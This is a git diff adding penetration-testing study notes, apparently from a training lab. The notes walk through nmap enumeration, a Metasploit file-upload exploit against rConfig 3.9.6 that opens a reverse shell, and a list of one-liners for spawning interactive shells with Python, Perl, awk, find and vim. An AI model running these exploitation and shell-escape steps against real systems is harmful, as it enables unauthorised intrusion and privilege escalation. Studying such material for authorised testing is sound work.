@@ -1,4 +1,4 @@
-# Introduction
+ # Introduction
 ### Shell Overview for Penetration Testing
 
 A **shell** provides a command-line interface (CLI) to interact with the system (e.g., Bash, cmd, PowerShell). For penetration testers, getting a shell often means successfully exploiting a vulnerability to gain remote access and control over a target machine.
@@ -398,6 +398,117 @@ Windows Subsystem for Linux (WSL) is a feature in Windows that lets you run a fu
 
 # Infiltrating Unix\Linux
 
+### 1. Initial Host Enumeration:
+- **Command**: `nmap -sC -sV 10.129.201.101`
+- **Purpose**: Discover open ports, services, and software versions.
+- **Findings**:
+  - FTP (`vsftpd 2.0.8+`) on port 21.
+  - SSH (`OpenSSH 7.4`) on port 22.
+  - Apache HTTPD (`2.4.6` on CentOS) with OpenSSL and PHP 7.2.34 on ports 80 and 443.
+  - MySQL on port 3306.
+  - RPCBind on port 111.
+- **Action**: This suggests a web server with multiple services. Focus on HTTP (Apache) and FTP for potential vulnerabilities, as these services may allow remote code execution (RCE).
+
+### 2. Vulnerability Research:
+- **Focus on rConfig 3.9.6** (found during web application discovery).
+- **Approach**: Research CVEs or exploits using keywords: “rConfig 3.9.6 vulnerability.”
+- **Common Findings**: Multiple RCE vulnerabilities exist for rConfig, including file upload vulnerabilities.
+
+### 3. Metasploit Exploit Search:
+- **Command**: `msf6 > search rconfig`
+- **Results**: Found multiple rConfig-related modules.
+  - `exploit/linux/http/rconfig_vendors_auth_file_upload_rce`: An exploit allowing RCE via a vulnerable file upload mechanism in rConfig.
+
+### 4. Loading and Running the Exploit:
+- **Command**: `use exploit/linux/http/rconfig_vendors_auth_file_upload_rce`
+- **Setup**:
+  - Set target IP, reverse shell listener IP, and port.
+  - Check if the target is vulnerable (`rConfig 3.9.6` is vulnerable).
+- **Execute**:
+```
+  msf6 exploit(linux/http/rconfig_vendors_auth_file_upload_rce) > exploit
+```
+ 
+Uploads a malicious PHP payload to the rConfig web interface.
+Executes the payload to establish a reverse shell to the attacker.
+### 5. Gaining a Meterpreter Shell:
+Successful exploitation opens a Meterpreter shell:
+
+Commands:
+shell: Drops into a system-level shell.
+dir or ls: Explore the filesystem of the target.
+
+### 6. Handling Non-TTY Shells:   
+ After gaining a shell, you may find it’s a non-tty shell, limiting functionality (e.g., can’t use sudo or su).
+
+ Solution: Spawn a full TTY shell using Python (if installed):
+ ```
+python -c 'import pty; pty.spawn("/bin/sh")'
+```
+### 7. Post-Exploitation:
+Objective: Privilege escalation or lateral movement to other systems.
+
+**whoami**: To verify which user the shell session is running as (e.g., apache).
+Explore the system further, looking for sensitive files, credentials, or ways to escalate privileges.
+
+## Spawning Interactive Shells
+
+After gaining a shell, we used Python to spawn a full TTY shell for better command access. This scenario is common in practice and real-world engagements, especially with limited or jail shells. If Python isn't available, there are other ways to spawn an interactive shell. It's important to know that /bin/sh or /bin/bash can often be replaced with any shell binary present on the system, with most Linux systems having bourne shell (/bin/sh) or bourne again shell (/bin/bash).
+### /bin/sh -i
+This command will execute the shell interpreter specified in the path in interactive mode (-i).
+
+### Perl (programming language)
+```
+perl —e 'exec "/bin/sh";'
+```
+```
+perl: exec "/bin/sh";
+```
+### Ruby
+```
+ruby: exec "/bin/sh"
+```
+### Lua
+If the programming language Lua is present on the system, we can use the os.execute method to execute the shell interpreter specified using the full command below:
+```
+lua: os.execute('/bin/sh')
+```
+### AWK
+AWK is a C-like pattern scanning and processing language present on most UNIX/Linux-based systems
+```
+awk 'BEGIN {system("/bin/sh")}'
+```
+### Find
+```
+find / -name nameoffile -exec /bin/awk 'BEGIN {system("/bin/sh")}' \;`
+```
+This use of the find command is searching for any file listed after the -name option, then it executes awk (/bin/awk) and runs the same script we discussed in the awk section to execute a shell interpreter.
+### Using Exec To Launch A Shell
+```
+find . -exec /bin/sh \; -quit
+```
+This use of the find command uses the execute option (-exec) to initiate the shell interpreter directly. If find can't find the specified file, then no shell will be attained.
+### VIM
+vim to shell
+```
+vim -c ':!/bin/sh'
+```
+vim to escape
+```
+vim
+:set shell=/bin/sh
+:shell
+```
+### Execution Permissions Considerations
+list files with permissions to know the permissions of the current shell sessions account.
+```
+ls -la <path/to/fileorbinary>
+```
+or
+```
+Sudo -l
+```
+The sudo -l command above will need a stable interactive shell to run. 
 # Web shells
 A web shell is a browser-based shell session we can use to interact with the underlying operating system of a web server. Again, to gain remote code execution via web shell, we must first find a website or web application vulnerability that can give us file upload capabilities. Most web shells are gained by uploading a payload written in a web language on the target server. The payload(s) we upload should give us remote code execution capability within the browser. 
 
